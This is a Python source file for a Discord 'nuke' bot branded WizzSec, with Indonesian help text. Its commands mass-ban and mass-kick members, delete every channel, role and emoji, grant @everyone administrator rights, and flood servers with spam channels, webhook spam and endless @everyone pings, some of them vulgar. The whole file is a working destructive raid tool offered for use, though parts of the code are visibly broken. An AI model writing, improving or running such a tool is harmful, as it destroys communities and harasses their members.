# YANG PAKE JANGAN BOCIL PANTEQ
from discord import Permissions
import discord
import os
from discord.ext import commands
import asyncio 
import random 
import requests
import sys
import threading
import datetime
import json
import aiohttp
from colorama import Fore
import time
import keep_alive
from pypresence import Presence

SPAM_CHANNEL = ["WizzSec","Nuker","xyop"]
SPAM_MESSAGE = ["NUKERS KONTOL HAKAN @everyone","@everyone XYOP NO COUNTER","WizzNoCounter"]

token = ""

client = commands.Bot(
    command_prefix=">", 
    intents=discord.Intents.all(),
    help_command=None
)

print(f"""
 __        ___          ____            
 \ \      / (_)________/ ___|  ___  ___ 
  \ \ /\ / /| |_  /_  /\___ \ / _ \/ __|
   \ V  V / | |/ / / /  ___) |  __/ (__ 
    \_/\_/  |_/___/___||____/ \___|\___|
BOT IS READY TO NUKE !              
Prefix -> (>)
""")
#time.sleep(99000)
@client.event
async def on_ready():
    await client.change_presence(activity=discord.Streaming(name='Project Nuke WizzSec', url='https://www.twitch.tv/nocopyrightsounds'))

@client.command(pass_context=True)
async def help(ctx):
        embed1 = discord.Embed(color=00000)
        embed1.set_author(name="Menu")
        embed1.set_footer(text="***BOT NUKE PROJECTS BY WIZZSEC, COMMANDS DALAM 15 DETIK HILANG***")
        embed1.set_thumbnail(url='https://media.discordapp.net/attachments/931824811569733693/949599018982473728/PicsArt_03-05-04.27.15.jpg?width=300&height=300')
        embed1.add_field(name="`>`help", value="```Liat Semua Menu Dek```", inline=False)
        embed1.add_field(name="`>`massban", value="```Massban orang yang di server```", inline=False)
        embed1.add_field(name="`>`masskick", value="```Masskick orang yang di server```", inline=False)
        embed1.add_field(name="`>`webhookspam", value="```Spam webhook server dek```", inline=False)
        embed1.add_field(name="`>`massspam",value="```Massspam Spam Channel```", inline=False)
        embed1.add_field(name="`>`massvcspam",value="```Massvcspam Spam Voice Channel```", inline=False)
        embed1.add_field(name="`>`massdchannels",value="```Massdchannels Delete All Channela```", inline=False)
        embed1.add_field(name="`>`masspingspam",value="```Masspingspam Spam Leg```", inline=False)
        embed1.add_field(name="`>`masslagspam",value="```Masslagspam Spam Lag```", inline=False)
        embed1.add_field(name="`>`massservername",value="```Massservername Contoh: >massservername [Name]```", inline=False)
        embed1.add_field(name="`>`massnickall",value="```Massnickall Contoh: >massnickall [Name]```", inline=False)
        embed1.add_field(name="`>`massnuke",value="```Massnuke Destroyer Server Dek```", inline=False)
        embed1.add_field(name="Important Links", value="[Support Server](https://discord.io/xyop) | [Invite-Bot](https://discord.com/api/oauth2/authorize?client_id=948920510157307994&permissions=8&scope=bot)", inline=False)
        embed1.set_image(url="https://media.discordapp.net/attachments/947444948624621618/948938616674074644/350kb.gif")
        embed2 = await ctx.reply(embed=embed1)
        time.sleep(15)
        await embed2.delete()
        await ctx.message.delete()

def ssspam(webhook):
    while spammingdawebhookeroos:
        randcolor = random.randint(0, 16777215)
        data = {'content':'@everyone WIZZSEC OP https://discord.io/xyop'}
            
        spamming = requests.post(webhook, json=data)
        spammingerror = spamming.text
        if spamming.status_code == 204:
            continue
        if 'rate limited' in spammingerror.lower():
            try:
                j = json.loads(spammingerror)
                ratelimit = j['retry_after']
                timetowait = ratelimit / 1000
                time.sleep(timetowait)
            except:
                delay = random.randint(5, 10)
                time.sleep(delay)

        else:
            delay = random.randint(30, 60)
            time.sleep(delay)

@client.command(aliases=['webhookfuck', 'spamwebhooks',"webhooknuke","webhooksnuke","webhooksfuck","spamwebhook"])
async def webhookspam(ctx):
    global spammingdawebhookeroos
    try:
        await ctx.message.delete()
    except:
        pass
    spammingdawebhookeroos = True
    if len(await ctx.guild.webhooks()) != 0: 
        for webhook in await ctx.guild.webhooks():
            threading.Thread(target = ssspam, args = (webhook.url,)).start()
    if len(ctx.guild.text_channels) >= 50:
        webhookamount = 1

    else:
        webhookamount = 50 / len(ctx.guild.text_channels) 
        webhookamount = int(webhookamount) + 1
    for i in range(webhookamount):  
        for channel in ctx.guild.text_channels:

            try:
            
                webhook =await channel.create_webhook(name='WizzSec Op')
                threading.Thread(target = ssspam, args = (webhook.url,)).start()
                f = open(r'data/webhooks-'+str(ctx.guild.id)+".txt",'a')
                f.write(f"{webhook.url} \n")
                f.close()

            except:
                print (f"{Fore.RED} > Webhook Error")
@client.command()
async def massspam(ctx,times_reapet=100,name_of_channel="WizzSec"):
  for times in range(times_reapet):
    guild = ctx.message.guild
    await guild.create_text_channel(name_of_channel)
  em3 = discord.Embed(title = f"Im Done spamming ***{times_reapet}*** amount of channels named ***{name_of_channel}***", color = 0x00000)
  print(f"Spammed {times_reapet} Channels")
  await ctx.message.delete()
  await ctx.send(embed=em3)

@client.command()
async def massvcspam(ctx,times_reapet=100,name_of_channel="WizzSec"):
  for times in range(times_reapet):
    guild = ctx.message.guild
    await guild.create_voice_channel(name_of_channel)
  em3 = discord.Embed(title = f"Im Done spamming ***{times_reapet}*** amount of voice channels named ***{name_of_channel}***", color = 0x00000)
  print(f"Spammed {times_reapet} Voice Channels")
  await ctx.message.delete()
  await ctx.send(embed=em3)

@client.command()
async def massban(ctx):
    for member in ctx.guild.members:
        if member == client.user:
            continue
        try:
            await member.ban()
        except discord.Forbidden:
            print(f"{member.name} has FAILED to be banned from {ctx.guild.name}")
        else:
            print(f"{member.name} has been kicked from {ctx.guild.name}")
    print("Banned all")

@client.command()
async def masskick(ctx):
    for member in ctx.guild.members:
        if member == client.user:
            continue
        try:
            await member.kick()
        except discord.Forbidden:
            print(f"{member.name} has FAILED to be kicked from {ctx.guild.name}")
        else:
            print(f"{member.name} has been kicked from {ctx.guild.name}")
    print("kicked all")

@client.command()
async def massdchannels(ctx):
  for channel in ctx.guild.channels:
      await channel.delete()
      print("/033[91 Sukses BanAll")
      await ctx.guild.create_text_channel(name="Kontol")
    await ctx.guild.create_voice_channel("• ▬▬▬▬▬▬▬▬ •")
    await ctx.guild.create_voice_channel("WizzSec")
    await ctx.guild.create_voice_channel("ON THE TOP")
    await ctx.guild.create_voice_channel("• ▬▬▬▬▬▬▬▬ •")

@client.command()
async def masspingspam(ctx):
    guild = ctx.message.guild
    await ctx.guild.edit(name="SERVER NUKE")
    print("raped channels <3")
    latters = "a:b:c:d:e:f:g:h:i:j:k:l:m:n:o:p:q:r:s:t:u:v:w:x:y:,:+:*:/:#: "
    lattersL = latters.split()
    while True:
      for time in range(random.randint(4,10)):
        r1 = random.choice(lattersL)
      try:
        await guild.create_text_channel("WizzSec")
        await guild.create_voice_channel("WizzSec")
      except:
        pass 
      for channel in ctx.guild.text_channels:
        try:
          webhook = discord.utils.get(await ctx.channel.webhooks(), name='Spammer')
          await channel.send(f"Nuke @everyone {r1}")
          await ctx.channel.create_webhook(name="WizzSec")
          await channel.send(f"Nuke! @everyone {r1}")
          await ctx.channel.create_webhook(name="WizzSec")
          await channel.send(f"Nuke! @everyone {r1}")
          await ctx.channel.create_webhook(name="WizzSec")
          await channel.send(f"Nuke @everyone {r1}")
          await ctx.channel.create_webhook(name="WizzSec")
          await channel.send(f"Nuke @everyone {r1}")
          await webhook.send()
        except:
          pass 

@client.command()
async def masslagspam(ctx):
  while True:
    for channel in ctx.guild.text_channels:
      await channel.send("🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿📣🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿📣📣🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿📣🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿@everyone")
      print("Lagging Channels")

@client.command()
async def massservername(ctx, name = None): 
  if name != None:
    await ctx.guild.edit(name=f"{name}")
    print("Changed Server Name")
    em200 = Embed(color = 0x00000, title=f"Nama Server Diubah Menjadi: ***{ctx.guild.name}***")
    em2001 = await ctx.send(embed=em200) 
    time.sleep(3)
    await em2001.delete()
  else:  
    em100 = Embed(color = 0x00000, title=ctx.guild.name)
    em1001 = await ctx.send(embed=em100)
    time.sleep(3)
    await em1001.delete()

@client.command()
async def massnickall(ctx, *, name="! TOOL RUNS YOU"):
  print("Nicking All")
  for member in ctx.guild.members:
    try:
      await member.edit(nick=name)
    except:
      pass 

@client.command()
async def massnuke(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    try:
      role = discord.utils.get(guild.roles, name = "@everyone")
      await role.edit(permissions = Permissions.all())
      print(Fore.MAGENTA + "I have given everyone admin." + Fore.RESET)
    except:
      print(Fore.GREEN + "I was unable to give everyone admin" + Fore.RESET)
    for channel in guild.channels:
      try:
        await channel.delete()
        print(Fore.MAGENTA + f"{channel.name} was deleted." + Fore.RESET)
      except:
        print(Fore.GREEN + f"{channel.name} was NOT deleted." + Fore.RESET)
    for member in guild.members:
     try:
       await member.ban()
       print(Fore.MAGENTA + f"{member.name}#{member.discriminator} Was banned" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{member.name}#{member.discriminator} Was unable to be banned." + Fore.RESET)
    for role in guild.roles:
     try:
       await role.delete()
       print(Fore.MAGENTA + f"{role.name} Has been deleted" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{role.name} Has not been deleted" + Fore.RESET)
    for emoji in list(ctx.guild.emojis):
     try:
       await emoji.delete()
       print(Fore.MAGENTA + f"{emoji.name} Was deleted" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{emoji.name} Wasn't Deleted" + Fore.RESET)
    banned_users = await guild.bans()
    for ban_entry in banned_users:
      user = ban_entry.user
      try:
        await user.unban("922666000304963635")
        print(Fore.MAGENTA + f"{user.name}#{user.discriminator} Was successfully unbanned." + Fore.RESET)
      except:
        print(Fore.GREEN + f"{user.name}#{user.discriminator} Was not unbanned." + Fore.RESET)
    await guild.create_text_channel("WIZZOP")
    for channel in guild.text_channels:
        link = await channel.create_invite(max_age = 0, max_uses = 0)
        print(f"New Invite: {link}")
    amount = 500
    for i in range(amount):
       await guild.create_text_channel(random.choice(SPAM_CHANNEL))
    print(f"nuked {guild.name} Successfully.")
    return

@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(SPAM_MESSAGE))

keep_alive.keep_alive()
client.run(token, bot=True)